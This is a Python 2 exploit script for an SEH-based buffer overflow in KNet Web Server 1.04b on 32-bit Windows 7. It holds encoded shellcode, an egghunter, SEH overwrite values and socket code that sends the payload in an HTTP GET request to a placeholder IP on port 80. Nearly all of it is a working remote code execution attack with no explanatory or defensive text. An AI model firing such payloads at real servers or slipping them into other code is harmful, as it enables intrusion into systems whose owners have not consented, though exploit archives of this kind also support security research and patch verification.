#KNet Web Server 1.04b - SEH Buffer Overflow with egghunter
#Win7 SP1 32bit
#Original here for Win 7: https://www.exploit-db.com/exploits/24897/

import struct, binascii, sys, socket

buf =  ""
buf += "\xd9\xd0\xd9\x74\x24\xf4\x5b\x53\x59\x49\x49\x49\x43"
buf += "\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30"
buf += "\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30"
buf += "\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42"
buf += "\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a"
buf += "\x49\x4b\x4c\x4d\x38\x4b\x32\x53\x30\x33\x30\x43\x30"
buf += "\x33\x50\x4c\x49\x4b\x55\x46\x51\x49\x50\x52\x44\x4c"
buf += "\x4b\x56\x30\x46\x50\x4c\x4b\x30\x52\x44\x4c\x4c\x4b"
buf += "\x56\x32\x34\x54\x4c\x4b\x53\x42\x36\x48\x34\x4f\x48"
buf += "\x37\x50\x4a\x47\x56\x56\x51\x4b\x4f\x4e\x4c\x57\x4c"
buf += "\x55\x31\x53\x4c\x43\x32\x46\x4c\x47\x50\x59\x51\x48"
buf += "\x4f\x54\x4d\x45\x51\x48\x47\x5a\x42\x4b\x42\x46\x32"
buf += "\x30\x57\x4c\x4b\x31\x42\x42\x30\x4c\x4b\x50\x4a\x47"
buf += "\x4c\x4c\x4b\x30\x4c\x54\x51\x33\x48\x4a\x43\x57\x38"
buf += "\x33\x31\x4e\x31\x50\x51\x4c\x4b\x46\x39\x37\x50\x53"
buf += "\x31\x38\x53\x4c\x4b\x47\x39\x54\x58\x5a\x43\x56\x5a"
buf += "\x30\x49\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x48\x56\x50"
buf += "\x31\x4b\x4f\x4e\x4c\x49\x51\x38\x4f\x44\x4d\x53\x31"
buf += "\x59\x57\x30\x38\x4d\x30\x32\x55\x4a\x56\x53\x33\x53"
buf += "\x4d\x4a\x58\x37\x4b\x53\x4d\x36\x44\x42\x55\x4a\x44"
buf += "\x31\x48\x4c\x4b\x36\x38\x46\x44\x53\x31\x49\x43\x42"
buf += "\x46\x4c\x4b\x34\x4c\x50\x4b\x4c\x4b\x46\x38\x35\x4c"
buf += "\x33\x31\x38\x53\x4c\x4b\x35\x54\x4c\x4b\x55\x51\x38"
buf += "\x50\x4b\x39\x31\x54\x46\x44\x31\x34\x31\x4b\x31\x4b"
buf += "\x33\x51\x56\x39\x50\x5a\x36\x31\x4b\x4f\x4b\x50\x51"
buf += "\x4f\x51\x4f\x51\x4a\x4c\x4b\x35\x42\x5a\x4b\x4c\x4d"
buf += "\x51\x4d\x35\x38\x30\x33\x47\x42\x45\x50\x33\x30\x32"
buf += "\x48\x53\x47\x44\x33\x46\x52\x51\x4f\x36\x34\x33\x58"
buf += "\x30\x4c\x53\x47\x56\x46\x34\x47\x4b\x4f\x49\x45\x4e"
buf += "\x58\x5a\x30\x55\x51\x55\x50\x43\x30\x47\x59\x4f\x34"
buf += "\x46\x34\x30\x50\x43\x58\x51\x39\x4d\x50\x32\x4b\x35"
buf += "\x50\x4b\x4f\x58\x55\x30\x50\x56\x30\x36\x30\x46\x30"
buf += "\x47\x30\x50\x50\x57\x30\x30\x50\x33\x58\x5a\x4a\x34"
buf += "\x4f\x59\x4f\x4b\x50\x4b\x4f\x4e\x35\x4a\x37\x32\x4a"
buf += "\x35\x55\x43\x58\x59\x50\x39\x38\x50\x5a\x4c\x42\x43"
buf += "\x58\x44\x42\x43\x30\x45\x51\x4f\x4b\x4d\x59\x4a\x46"
buf += "\x43\x5a\x42\x30\x51\x46\x56\x37\x32\x48\x5a\x39\x59"
buf += "\x35\x32\x54\x55\x31\x4b\x4f\x39\x45\x4d\x55\x59\x50"
buf += "\x54\x34\x54\x4c\x4b\x4f\x50\x4e\x33\x38\x34\x35\x4a"
buf += "\x4c\x53\x58\x4a\x50\x38\x35\x4e\x42\x31\x46\x4b\x4f"
buf += "\x49\x45\x33\x5a\x53\x30\x42\x4a\x45\x54\x50\x56\x56"
buf += "\x37\x53\x58\x35\x52\x4e\x39\x58\x48\x51\x4f\x4b\x4f"
buf += "\x38\x55\x4c\x4b\x50\x36\x53\x5a\x31\x50\x55\x38\x43"
buf += "\x30\x52\x30\x33\x30\x33\x30\x36\x36\x32\x4a\x35\x50"
buf += "\x42\x48\x30\x58\x49\x34\x36\x33\x4b\x55\x4b\x4f\x49"
buf += "\x45\x4d\x43\x46\x33\x43\x5a\x43\x30\x36\x36\x50\x53"
buf += "\x30\x57\x35\x38\x45\x52\x58\x59\x49\x58\x51\x4f\x4b"
buf += "\x4f\x48\x55\x43\x31\x49\x53\x37\x59\x39\x56\x52\x55"
buf += "\x5a\x4e\x49\x53\x41\x41"

egg="w00tw00t"
egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
search=len(egg+egghunter)

nseh="\x90\x90\xeb\xD7"
seh=struct.pack("<I",0x6c255875)
string="\x90"*4+egg+buf+"\x41"*(611-search)+egghunter+nseh+seh+"\x90"*240

ips="IP_Address"
port=80

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
	connect=s.connect((ips, port))
except:
	print "no connection possible"
	sys.exit(1)

print "\r\nsending payload"
print "..."

payload = (
'GET %s HTTP/1.0\r\n'
'\r\n') % (string)


s.send(payload)
s.close()

print "Done\n"
